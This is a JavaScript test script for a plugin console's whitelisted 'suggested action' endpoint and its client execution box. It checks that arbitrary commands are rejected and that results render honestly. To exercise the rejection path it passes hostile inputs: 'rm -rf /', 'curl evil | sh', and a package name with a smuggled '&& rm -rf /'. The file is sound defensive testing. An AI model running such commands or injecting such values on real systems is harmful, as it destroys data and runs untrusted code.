// 「建议动作」执行框的专项验证（2026-09-27 加法；任务 C 的四条逐条钉死）
//
// C1 服务端：结构化动作接口（白名单动作类型、服务端自拼 argv）——**绝不接受客户端传来的命令字符串**
// C2 下发：安装结果里带 `suggestedAction = { kind, label, command, payload }`（老客户端忽略即向后兼容）
// C3 客户端：安装结果卡片旁的**小执行框**（短句 + 等宽只读命令 + 执行/复制 + 执行中 + 结果/错误 + 可关闭）
// C4 测试：结构契约（路由清单 + 字段）+ 离线渲染断言（有/无、执行中、成功、失败、中英切换）
//        + 服务端拒绝任意命令（`command:'rm -rf /'` 之类必须 400 且**一次都没执行**）
//
// 离线渲染的做法：client.js 只 require("react")、只 export 组件与若干纯函数 —— 于是可以喂一个
// **假 React**（真实极小的 hooks 运行时：useState 真能重渲染），把安装结果里的执行框真渲染成元素树，
// 再对树上的文本/按钮做断言。整条链路（点「执行」→ 发 POST /run-suggested → 回显结果）都跑在
// 假 fetch 上，**不发网络请求、不碰真实 profile**。
import { readFileSync, mkdirSync, writeFileSync, rmSync, existsSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { ACTION_KINDS, COMMAND_KEYS, parseActionRequest, runSuggestedAction, isReleaseAgeBlock } from '../lib/server/domain/plugin-actions.js'
import { preferredRegistries } from '../lib/server/domain/sources.js'

const ROOT = dirname(fileURLToPath(import.meta.url))
const HOME = join(ROOT, '.testdir', 'plugin-actions-home')
process.env.DSH_HOME = HOME

let failed = 0
const check = (label, cond, extra) => {
  console.log(`${cond ? 'PASS' : 'FAIL'} ${label}${extra === undefined ? '' : ' — ' + extra}`)
  if (!cond) failed += 1
}

rmSync(HOME, { recursive: true, force: true })
const PROFILE = join(HOME, 'profiles', 'web')
mkdirSync(join(PROFILE, 'node_modules', '@fake', 'demo'), { recursive: true })
writeFileSync(join(PROFILE, 'cordis.patch.yml'), '# actions test\n', 'utf8')
writeFileSync(join(PROFILE, 'node_modules', '@fake', 'demo', 'package.json'), JSON.stringify({ name: '@fake/demo', version: '1.0.0', main: 'index.js' }), 'utf8')
writeFileSync(join(PROFILE, 'node_modules', '@fake', 'demo', 'index.js'), 'export const ok = true\n', 'utf8')
const writeManifest = (deps) => writeFileSync(join(PROFILE, 'package.json'), `${JSON.stringify({ name: 'dsh-profile-actions', private: true, dependencies: deps }, null, 2)}\n`, 'utf8')
writeManifest({ '@fake/demo': '1.0.0' })

console.log('=== C4-① 结构契约：路由清单 + 白名单动作 + payload 无命令位置 ===')
{
  // 路由清单（与 tests/test-route-inventory.mjs 的 58 条清单同一口径：源码里必须真的有这条 path）
  const walk = (dir) => readFileSync(dir, 'utf8')
  const routeSrc = walk(join(ROOT, '..', 'lib', 'server', 'routes', 'index.js'))
  check('路由 /plugin-console/run-suggested 已在路由表里注册（与路由清单测试同一口径）',
    routeSrc.includes('`${ROUTE_PREFIX}/run-suggested`'), 'routes/index.js')
  const actionSrc = readFileSync(join(ROOT, '..', 'lib', 'server', 'domain', 'plugin-actions.js'), 'utf8')
  check('白名单只有我们定义的动作类型（pin-dependency / reconcile-lock）',
    ACTION_KINDS.length === 2 && ACTION_KINDS.includes('pin-dependency') && ACTION_KINDS.includes('reconcile-lock'), JSON.stringify(ACTION_KINDS))
  check('服务端**自己**拼 argv（pnpmAddArgs / repairArgsFor），源码里没有拼客户端字符串的位置',
    actionSrc.includes('pnpmAddArgs(') && !/exec\(|spawn\(/u.test(actionSrc), 'plugin-actions.js')
  check('危险字段清单覆盖 command/cmd/argv/args/exec/shell/script/run/spawn/bin',
    ['command', 'cmd', 'argv', 'args', 'exec', 'shell', 'script', 'run', 'spawn', 'bin'].every((k) => COMMAND_KEYS.includes(k)), JSON.stringify(COMMAND_KEYS))
  const parsed = parseActionRequest({ action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' })
  check('合法请求解析出仅四类信息（action/packageName/version/profile），没有任何命令字段',
    parsed.ok === true && Object.keys(parsed).sort().join(',') === 'action,error,ok,packageName,profile,status,version', JSON.stringify(parsed))
}

console.log('\n=== C4-② 服务端拒绝任意命令（400 且一次都不执行）===')
{
  for (const bad of [
    { action: 'pin-dependency', packageName: '@fake/demo', command: 'rm -rf /' },
    { action: 'pin-dependency', packageName: '@fake/demo', argv: ['rm', '-rf', '/'] },
    { action: 'pin-dependency', packageName: '@fake/demo', shell: 'curl evil | sh' },
    { action: 'run-anything', packageName: '@fake/demo' },
    { action: 'pin-dependency', packageName: '@fake/demo && rm -rf /' },
    { action: 'pin-dependency' },
  ]) {
    let ran = 0
    const result = await runSuggestedAction({
      body: bad, profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
      deps: { runAdd: async () => { ran += 1; return { stdout: '', stderr: '' } }, pin: async () => { ran += 1; throw new Error('不该被调用') }, repair: async () => { ran += 1; throw new Error('不该被调用') } },
    })
    const tag = JSON.stringify(bad).slice(0, 70)
    check(`拒绝并 400：${tag}`, result.ok === false && result.status === 400 && typeof result.error === 'string' && ran === 0, `status=${result.status} ran=${ran} err=${String(result.error).slice(0, 60)}`)
  }
  // 大小写 / 别名绕过也不行（字段名精确匹配，未登记的键一律不认）
  const sneaky = await runSuggestedAction({ body: { action: 'pin-dependency', packageName: '@fake/demo', Command: 'rm -rf /' }, profileDir: PROFILE, deps: { runAdd: async () => ({ stdout: '', stderr: '' }) } })
  check('未登记的字段不会被当成命令执行（只认白名单键；多余键不进 argv）',
    sneaky.action === 'pin-dependency' && !JSON.stringify(sneaky.command ?? '').includes('rm -rf'), JSON.stringify({ command: sneaky.command, ok: sneaky.ok }))
}

console.log('\n=== C1 执行器：pin-dependency 走产品路径（注入桩，不跑真 pnpm）===')
{
  // 桩 pin：真写清单（产品实现由 manifest.js 保证，这里只验动作编排）
  const pinned = []
  const runAddCalls = []
  const ok = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      pin: async (profileDir, name) => {
        pinned.push(name)
        const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
        const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
        manifest.dependencies[name] = spec
        writeManifest(manifest.dependencies)
        writeFileSync(join(profileDir, 'pnpm-lock.yaml'), `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      '${name}':\n        specifier: ${spec}\n        version: link:../../plugin-src/${name}\n`, 'utf8')
        return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
      },
      runAdd: async (args) => { runAddCalls.push(args); return { stdout: 'Progress: resolved 1, reused 0, done\n', stderr: '' } },
    },
  })
  check('★ pin-dependency：清单与 lock 都指向 link: 时 ok=true、exitCode=0',
    ok.ok === true && ok.exitCode === 0 && ok.manifest.pinned === true && ok.lock.synced === true, JSON.stringify({ ok: ok.ok, exit: ok.exitCode, manifest: ok.manifest, lock: ok.lock }))
  check('★ 执行的是服务端自拼的 argv（pnpm add <link:…> --registry <主源>），且 command 仅供展示',
    runAddCalls.length === 1 && runAddCalls[0][0] === 'add' && String(runAddCalls[0][1]).startsWith('link:')
    && runAddCalls[0].includes('--registry') && String(ok.command).startsWith('pnpm add link:'), JSON.stringify(runAddCalls[0]))
  check('★ 动作只对本 profile 清单里的包生效（不在清单里的包 400，不执行）',
    (await runSuggestedAction({ body: { action: 'pin-dependency', packageName: 'left-pad' }, profileDir: PROFILE, deps: { pin: async () => { throw new Error('不该被调用') } } })).status === 400,
    'left-pad 未声明')

  // 失败路径：pnpm 报错 → ok=false，stdout/stderr 摘要与 exitCode 原样回显（不假装成功）。
  // 先把现场还原成"清单是版本号、lock 里没有这条"（否则上一步的 stub 已经把它对齐了，失败也无从体现）。
  writeManifest({ '@fake/demo': '1.0.0' })
  rmSync(join(PROFILE, 'pnpm-lock.yaml'), { force: true })
  const bad = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      // 只写清单、不写 lock（模拟"pnpm 挂了/被占用，只完成了清单这一半"）
      pin: async (profileDir, name) => {
        const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
        const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
        manifest.dependencies[name] = spec
        writeManifest(manifest.dependencies)
        return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
      },
      runAdd: async () => { const e = new Error('Command failed: pnpm add link:…'); e.code = 1; e.stdout = 'partial out\n'; e.stderr = 'ERR_PNPM_FETCH_404 boom\n'; throw e },
    },
  })
  check('★ pnpm 失败时如实回报（ok=false + exitCode + stderr 摘要），且清单已钉住这一半如实标成 partial',
    bad.ok === false && bad.partial === true && bad.exitCode === 1 && bad.stderr.includes('ERR_PNPM_FETCH_404')
    && bad.manifest.pinned === true && bad.lock.synced === false, JSON.stringify({ ok: bad.ok, partial: bad.partial, exit: bad.exitCode, lock: bad.lock, pinned: bad.manifest?.pinned }))
  check('★ 供应链闸判据只认 pnpm 自己的错误码/文案（认不出就绝不放宽）',
    isReleaseAgeBlock('ERR_PNPM_MINIMUM_RELEASE_AGE_VIOLATION: x') === true && isReleaseAgeBlock('boom') === false)

  // reconcile-lock：复用 lockfile-health 的 repair（唯一 argv 产出点）
  const repairView = { ok: true, action: 'repaired', command: 'install --lockfile-only --no-frozen-lockfile --registry https://registry.npmmirror.com', reason: '只重写了 pnpm-lock.yaml；package.json 与 node_modules 未改动。', hint: 'lock 已按清单重建', stderrTail: null, packages: [] }
  const recon = await runSuggestedAction({ body: { action: 'reconcile-lock', profile: 'web' }, profileDir: PROFILE, registries: ['https://registry.npmmirror.com'], deps: { repair: async () => repairView } })
  check('★ reconcile-lock：复用 lockfile-health 的 repair（argv 不带任何绕过供应链闸的开关）',
    recon.ok === true && recon.command === repairView.command && !/minimumReleaseAge/u.test(recon.command), JSON.stringify({ ok: recon.ok, command: recon.command }))
  check('主源优先的 registry 列表非空（探测/执行共用一份口径）', preferredRegistries().length > 0, JSON.stringify(preferredRegistries()))
}

console.log('\n=== C1 真机路径（真 pnpm、不出外网）：动作的 pnpm 那一步真的跑起来 ===')
// 为什么单开一段：上面那段把 runAdd 换成了桩（为了钉住"失败也要如实回报"），但**动作真的会执行 pnpm**
// 这件事必须由真 pnpm 证一次 —— 用隔离 profile + 一个只在本地存在的包（link: 不经 registry），
// 断言：exitCode=0、清单/lock 都是 link:、且 node_modules/<包名> 真的被 pnpm 换成了指向 plugin-src 的链接。
{
  const REAL_PKG = '@dsh-probe/pin-only-7c1f9a'
  const realDir = join(PROFILE, 'node_modules', ...REAL_PKG.split('/'))
  mkdirSync(realDir, { recursive: true })
  writeFileSync(join(realDir, 'package.json'), JSON.stringify({ name: REAL_PKG, version: '0.0.1-rc9', main: 'index.js' }), 'utf8')
  writeFileSync(join(realDir, 'index.js'), 'export const ok = true\n', 'utf8')
  writeManifest({ ...JSON.parse(readFileSync(join(PROFILE, 'package.json'), 'utf8')).dependencies, [REAL_PKG]: '0.0.1-rc9' })
  rmSync(join(PROFILE, 'pnpm-lock.yaml'), { force: true })
  let pnpmUsable = true
  let pnpmError = null
  try {
    const { runPnpmWithFallback } = await import('../lib/server/infra/exec.js')
    await runPnpmWithFallback(['--version'], { execOpts: { cwd: PROFILE, timeout: 60000, windowsHide: true } })
  } catch (error) {
    pnpmUsable = false
    pnpmError = String(error?.message ?? error).slice(0, 300)
  }
  if (!pnpmUsable) {
    console.log(`SKIP 真 pnpm 组（动作的 pnpm 那一步） —— 真 pnpm 通道不可用：${pnpmError}`)
  } else {
    const real = await runSuggestedAction({
      body: { action: 'pin-dependency', packageName: REAL_PKG, version: '0.0.1-rc9', profile: 'web' },
      profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    })
    const spec = JSON.parse(readFileSync(join(PROFILE, 'package.json'), 'utf8')).dependencies[REAL_PKG]
    const lockText = readFileSync(join(PROFILE, 'pnpm-lock.yaml'), 'utf8')
    check('★ 真 pnpm：动作执行成功（ok=true、exitCode=0、清单是 link:、lock 有条目、stdout/命令原样回显）',
      real.ok === true && real.exitCode === 0 && real.manifest.pinned === true && real.lock.synced === true
      && real.relaxedReleaseAge === false && String(real.command).startsWith('pnpm add link:')
      && String(spec).startsWith('link:') && lockText.includes(`'${REAL_PKG}':`),
      JSON.stringify({ ok: real.ok, exit: real.exitCode, spec, lock: real.lock, stderr: String(real.stderr).slice(-160) }))
    let linkType = null
    try {
      const { lstatSync } = await import('node:fs')
      linkType = lstatSync(realDir).isSymbolicLink() ? 'symlink' : 'dir'
    } catch { linkType = 'missing' }
    check('★ 真 pnpm：node_modules/<包名> 被真的换成了指向 plugin-src 的链接（不是只写了两个文本文件）',
      linkType === 'symlink', `linkType=${linkType}`)
  }
}

console.log('\n=== C3/C4-③ 离线渲染：用假 React 真渲染安装结果里的执行框 ===')
{
  // ── 假 React：真实极小的 hooks 运行时（useState 真能重渲染），其余 API 只做形状兼容 ──
  const makeReact = () => {
    let hooks = []
    let cursor = 0
    let current = null
    let rerender = null
    const react = {
      createElement: (type, props, ...children) => ({ type, props: { ...(props ?? {}), children: children.length <= 1 ? children[0] : children } }),
      useState: (initial) => {
        const index = cursor
        cursor += 1
        if (hooks[index] === undefined) hooks[index] = initial
        const set = (next) => { hooks[index] = typeof next === 'function' ? next(hooks[index]) : next; if (rerender !== null) rerender() }
        return [hooks[index], set]
      },
      useRef: (initial) => { const index = cursor; cursor += 1; if (hooks[index] === undefined) hooks[index] = { current: initial }; return hooks[index] },
      useEffect: () => {}, useMemo: (fn) => fn(), useCallback: (fn) => fn, useReducer: (r, i) => [i, () => {}],
    }
    react.__setCurrent = (fn) => { current = fn }
    react.__reset = () => { hooks = []; cursor = 0 }
    react.__render = () => { cursor = 0; return current() }
    react.__setRerender = (fn) => { rerender = fn }
    return react
  }
  const react = makeReact()
  let exports = null
  globalThis.window = {
    __ModuleLoader__: {
      load: ({ factory }) => { exports = factory((name) => { if (name === 'react') return react; throw new Error(`unexpected require: ${name}`) }) },
    },
    setTimeout: () => 0, clearInterval: () => {}, setInterval: () => 0, location: { reload: () => {} },
  }
  globalThis.document = { querySelector: () => null, createElement: () => ({ dataset: {}, style: {}, appendChild: () => {} }), head: { appendChild: () => {} } }
  await import(pathToFileURL(join(ROOT, '..', 'lib', 'client.js')).href)
  check('client.js 可离线加载（只 require("react")）并导出执行框组件（供渲染断言）',
    exports !== null && typeof exports.SuggestedActionBox === 'function' && typeof exports.apply === 'function')

  // ── 极简渲染：把元素树折成可断言的文本/按钮清单 ──
  const flatten = (node, out = { texts: [], buttons: [], nodes: [], codes: [] }) => {
    if (node === null || node === undefined || node === false) return out
    if (Array.isArray(node)) { for (const n of node) flatten(n, out); return out }
    if (typeof node === 'string' || typeof node === 'number') { out.texts.push(String(node)); return out }
    if (typeof node.type === 'function') { return flatten(node.type(node.props), out) }
    out.nodes.push({ tag: node.type, className: node.props?.className ?? null, disabled: node.props?.disabled === true, onClick: node.props?.onClick ?? null, title: node.props?.title ?? null, props: node.props ?? {} })
    if (node.type === 'button') out.buttons.push(node.props?.children)
    if (node.type === 'code') out.codes.push(node.props?.children)
    flatten(node.props?.children, out)
    return out
  }
  // 真渲染一个"作业"（job 就是 /install-status 下发的对象）→ 折成文本/按钮。
  // 关键：把组件函数**当组件调用**（经过假 React 的 hooks 运行时），而不是只造一个元素对象 ——
  // 否则 useState 的更新不会触发任何重渲染，"执行中/成功/失败"三种状态就断言不出来。
  const renderJob = (job, t) => {
    react.__reset()
    const tree = []
    react.__setRerender(() => { tree.length = 0; tree.push(react.__render()) })
    react.__setCurrent(() => exports.SuggestedActionBox({ job, t }))
    tree.push(react.__render())
    return { tree, calls: () => { tree.length = 0; tree.push(react.__render()) }, view: () => flatten(tree[0]) }
  }
  const buttonByText = (flat, text) => flat.nodes.find((n) => n.tag === 'button' && n.props?.children === text)
  const zh = (key, vars) => {
    const dict = {
      actionBoxTitle: '建议动作', actionPinLabel: '钉住该依赖（按 link: 记录）', actionReconcileLabel: '重建 pnpm-lock.yaml',
      actionRun: '执行', actionCopy: '复制', actionCopied: '已复制命令', actionRunning: '执行中…',
      actionOk: '执行成功', actionPartial: '部分成功（清单已改，lock 未对齐）', actionFailed: '执行失败',
      actionLongTitle: '控制台按白名单动作执行', closeModal: '关闭',
    }
    return dict[key] ?? key
  }
  const en = (key) => {
    const dict = {
      actionBoxTitle: 'Suggested action', actionPinLabel: 'Pin this dependency (record as link:)', actionReconcileLabel: 'Rebuild pnpm-lock.yaml',
      actionRun: 'Run', actionCopy: 'Copy', actionCopied: 'Command copied', actionRunning: 'Running…',
      actionOk: 'Done', actionPartial: 'Partly done (manifest updated, lock not aligned)', actionFailed: 'Failed',
      actionLongTitle: 'The console runs a whitelisted action inside its own process', closeModal: 'Close',
    }
    return dict[key] ?? key
  }
  const payload = { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' }
  const action = { kind: 'pin-dependency', label: '钉住该依赖（按 link: 记录）', command: 'pnpm add link:C:/Users/x/.dsh/plugin-src/@fake/demo --registry https://registry.npmmirror.com', payload }

  // ① 无 suggestedAction → 不渲染（不占版面）
  const none = renderJob({ jobId: 'j0', status: 'done', packageName: '@fake/demo', suggestedAction: null }, zh)
  check('★ 渲染断言：作业里没有 suggestedAction → 组件返回 null（不占版面）', none.tree[0] === null, String(none.view().texts.join('|')))

  // ② 有 suggestedAction → 短说明 + 等宽只读命令 + 「执行」「复制」
  const view = renderJob({ jobId: 'j1', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  const flat = view.view()
  check('★ 渲染断言：有 suggestedAction → 出现标题/短说明 + 两个按钮（执行 / 复制）+ 等宽命令',
    flat.texts.includes('建议动作') && flat.texts.includes('钉住该依赖（按 link: 记录）') && flat.buttons.includes('执行') && flat.buttons.includes('复制')
    && flat.codes.includes(action.command), JSON.stringify({ buttons: flat.buttons, codes: flat.codes }))
  check('★ 渲染断言：命令是只读展示（code 元素，不是输入框），长解释挂 title 而不是铺在面板上',
    flat.nodes.some((n) => n.tag === 'code') && !flat.nodes.some((n) => n.tag === 'input')
    && flat.nodes.some((n) => typeof n.title === 'string' && n.title.includes('白名单')), JSON.stringify(flat.nodes.map((n) => n.tag)))

  // ③ 中英切换：同一份数据换字典 → 按钮文案跟着变
  const enView = renderJob({ jobId: 'j2', status: 'done', packageName: '@fake/demo', suggestedAction: action }, en).view()
  check('★ 渲染断言：中英切换（同一 action，同一棵结构，按钮文案跟随字典）',
    enView.texts.includes('Suggested action') && enView.buttons.includes('Run') && enView.buttons.includes('Copy')
    && enView.texts.includes('Pin this dependency (record as link:)'), JSON.stringify(enView.buttons))

  // ④ 执行中 → 按钮禁用 + 文案变「执行中…」（点一次只发一次请求）
  let fetchCalls = 0
  let resolveFetch = null
  const fetchLog = []
  globalThis.fetch = (path, options) => {
    fetchCalls += 1
    fetchLog.push({ path, body: options?.body === undefined ? null : JSON.parse(options.body) })
    return new Promise((resolve) => { resolveFetch = () => resolve({ ok: true, status: 200, json: async () => ({ ok: true, reason: '已钉住' }) }) })
  }
  const running = renderJob({ jobId: 'j3', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(running.view(), '执行').onClick()
  running.calls()
  const runningFlat = running.view()
  check('★ 渲染断言：执行中 → 出现「执行中…」且执行按钮被禁用（防重复点击）',
    runningFlat.texts.includes('执行中…') && runningFlat.nodes.some((n) => n.tag === 'button' && n.disabled === true && n.props?.children === '执行中…'),
    JSON.stringify({ texts: runningFlat.texts, disabled: runningFlat.nodes.filter((n) => n.disabled).length }))
  check('★ 渲染断言：点「执行」发的是**结构化动作**（POST /plugin-console/run-suggested + payload），不带任何命令字符串',
    fetchCalls === 1 && fetchLog.length === 1 && fetchLog[0].path === '/plugin-console/run-suggested'
    && JSON.stringify(fetchLog[0].body) === JSON.stringify(payload), JSON.stringify(fetchLog))
  await new Promise((r) => { resolveFetch(); setTimeout(r, 0) })
  await new Promise((r) => setTimeout(r, 0))
  running.calls()
  const doneFlat = running.view()
  check('★ 渲染断言：成功 → 回显「执行成功」+ 服务端 reason',
    doneFlat.texts.some((s) => s.includes('执行成功')) && doneFlat.texts.some((s) => s.includes('已钉住')), JSON.stringify(doneFlat.texts))

  // ⑤ 失败 → 错误回显 + 可关闭
  globalThis.fetch = () => Promise.resolve({ ok: true, status: 200, json: async () => ({ ok: false, partial: true, exitCode: 1, reason: '清单已钉住，lock 未对齐', stderr: 'ERR_PNPM_X boom\n' }) })
  const failedView = renderJob({ jobId: 'j4', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(failedView.view(), '执行').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  failedView.calls()
  const fFlat = failedView.view()
  check('★ 渲染断言：失败/部分成功 → 如实回显（"部分成功…" + reason + stderr 末行），不是"成功"',
    fFlat.texts.some((s) => s.includes('部分成功')) && fFlat.texts.some((s) => s.includes('清单已钉住，lock 未对齐'))
    && !fFlat.texts.includes('执行成功'), JSON.stringify(fFlat.texts))
  const closeBtn = fFlat.nodes.find((n) => n.tag === 'button' && n.props?.['aria-label'] === '关闭')
  check('★ 渲染断言：可关闭（✕ 按钮存在且带 aria-label）', closeBtn !== undefined)
  closeBtn.onClick()
  failedView.calls()
  check('★ 渲染断言：关闭后整块消失（返回 null）', failedView.tree[0] === null)

  // ⑥ 复制按钮（navigator 是全局 getter：用 defineProperty 覆盖成 stub；覆盖不了就响亮跳过）
  let copied = null
  let clipboardReady = true
  try {
    Object.defineProperty(globalThis, 'navigator', { value: { clipboard: { writeText: (text) => { copied = text; return Promise.resolve() } } }, configurable: true })
  } catch (error) {
    clipboardReady = false
    console.log(`SKIP 复制按钮断言 —— 本 Node 无法替换 globalThis.navigator：${String(error?.message ?? error).slice(0, 80)}`)
  }
  const copyView = renderJob({ jobId: 'j5', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(copyView.view(), '复制').onClick()
  copyView.calls()
  if (clipboardReady) {
    check('★ 渲染断言：点「复制」复制的是**展示用命令**（只读字符串，不参与执行）',
      copied === action.command && copyView.view().texts.includes('已复制命令'), String(copied))
  }
}

rmSync(HOME, { recursive: true, force: true })
console.log(failed === 0 ? '\nALL PASS' : `\n${failed} FAILED`)
process.exit(failed === 0 ? 0 : 1)
